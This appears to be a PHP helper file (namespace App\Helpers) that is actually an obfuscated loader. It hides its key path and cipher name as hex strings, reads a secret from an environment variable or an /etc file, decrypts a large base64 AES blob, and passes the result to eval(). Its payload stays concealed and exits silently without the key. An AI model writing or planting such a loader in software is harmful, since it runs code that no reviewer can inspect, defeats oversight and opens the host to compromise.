<?php
namespace App\Helpers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('kEN8ZcTZyapMCEavwtuKrg==');

$c=base64_decode(

'cRY8NbkeXyIvqkuIfMcVhKgp8ZwT9dZqIgnrb6EWhoOz/Cv53NW6YzQOYst9QgibZQv5zHQ8PLov' .
'BrYXGm3T4moenZjM7XR1nmundjbPQD5ZQXppVyqiYpkH2di23qjZK/ddf6RdeXQCFtqTNSzx/JET' .
'zVrh6AS3822KddS51qQqapoQl76wVUq2Pg3K5LCGcuLj1xV3h+G8oig1bQXqk2ObHiDe10E5f0jK' .
'l/2junq2atup8dlCzsDn7+Ga/B5yOrZKtj6hImogqWz8DFMJp7HA7DCgHuohPjB/PWHQ2pL7I3Pu' .
'X0oUu5aSIwP/qin3XoxIEa2XF3atepxdbi5RLuHb/Xap68ClNRuivGPyu391DvSClOmP5lrxpy3I' .
'KToE1uX+ekSbwHm07wEuTeQ+TZ19zjghXLnydVJTM5xAzdWVF4k1bd9DqAkfYWbCHLPgEJOyKU3u' .
'XvO2qW79MfU1Ds7DKNCMirPT+roja1cWLG8X8vd7/MBnV2cjnStucmfGPiaGy9WJkEtbihZuhuq3' .
'3T3xQI1bLhqrwcbJjdTuh0RJ1TMVjALGqCt/0DiRrzpb6bY6adi/+C17qfjqdLWecwNrlwthw0UG' .
'XwpGhzD3D19ENfZcCuAzF9I85Ir+xiSpgogZBB2Qtb6A5PJNwLT9Plll7Yfz/saGVNJP3LCYIL0J' .
'hQAeFgM6ZY+9wkznFApGwaSnajdzbYP1uwylRIXtj+xXhGwYZ5H+uoABl7lubyfxOvPNjEH7dbon' .
'Ee8FZOYvlzrvjZ4bHFLI1Am868M70u51GlhPVegMBo5h+dcCBdlZl3lTDTvG84JEsLorhIHJfzJu' .
'GtaZSfGer2ENlWgKjCP9c3tUGhHxRx42jKEr8cc1QLPhLwpZ9Y1gkQQNXcGFOW8vzbBbv46Vfuj8' .
'vqGEAVl15J7wfi2JsToZMrF8kje4Kw+YCGWiAAq7HCG6hK4bIE0phr4gldn7gBFSk0YXVeBKRL+k' .
'h2jvEuTXxFK9QzchEJk84w1FynR+4jxuH5xmlgtwj/IgbkuqeoJTgp2qxEEpLSZbXk3iHb1E5x1Y' .
'rMjxQ6SbtxG3UtAezyxZSNriJTArOlFUGP6tXmygO3+lk0dPrt/s4kdnrBUJR58f0RGphPaVVvAb' .
'Qtg/kfqrGtNwJEgu8mdTVgud/O3OFojgC1eWCiTjh+RE4zZY/e4hyKCo+bJD3FmAr7bOiJ2JUT41' .
'yjwDTX7H0BwVMrpyjVcy41lO6H3dCgJtjbtmGr7WBlF/zfAp3EFL61hNkTs0rR6HiSxTB54f3S+N' .
'ql1NBqkarBvuG188a10OTIFP5zV26i1xLzak/xw+9i3s50qxt1fY7zAsTzImxMFGMFmLwXSlC8q8' .
'35Z0FIXghqaE1D0LyZQ8clhwzx69G9UZ5cZ+MQ0SiPgG3zDN83WTOu0jIaWrRYlA7/Ai28GZuyEV' .
'4f/0vVx+yuHPlAEbF9COoB5kgKPopGM38zW7HjYBKxOYvZ8qfO67nl8jpTdm3w3yirRkC4OFHe4j' .
'dYrAq5MYJph1W/0Lp2xXXOekhNY4mdlM8Wvq2fpG4PwxuhxVv1+297qyjq5Cm/kRtwRXn6LSXBLk' .
'hJ1TNzSLVkLIuE64TsuUyUBW1gfebc/mYSIpn48FbLUlqgnMriATZdIJomoRxfLSZTlWsz12guKf' .
'zxwC5KwXWYcCMfddKEywz24Vp6m5XHd/z11p8kHgHR2rgqQbiZ/usH4oqABoIiQnNvmTzaA/+Hbt' .
'V55LJvaiDdCRb32OzYqoOf9odrIav3YGIWHckyYNTC9h5U8xJWbbq6fpgjqm9LSh/FzqXmXXfnrE' .
'ZurrLGlgV8Jv3aRWRPudbBlhN5Vg6qGHOndwIP0i+/CUPyBf2wd3JUAZGGWoxozytLGLtkCDdezK' .
'o2lShk1zs7FyR/Zni98addvHuiO5DpijDCbAU8KJQXYPYQw7hVXbhr+TSJsrzcRJhgMunm8WtU8T' .
'reprGv0cjtZKK5o8yWJTu1Gn/B4TgOHRzHjUA16nFRG+BL9ifVfwgPjsyUGHt7Mt06bMG7qDLMmC' .
'GHGST8RS9h6wtPmlFdQWEu73WX59CergRS0To9mFSGpVGiqw5y59xlWcOalhNsts1p8G644OI3TT' .
'/I+706fqd51urcQIdgpJT+EkuxMzzNM7hdyWGTyVBhuvI1sd'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

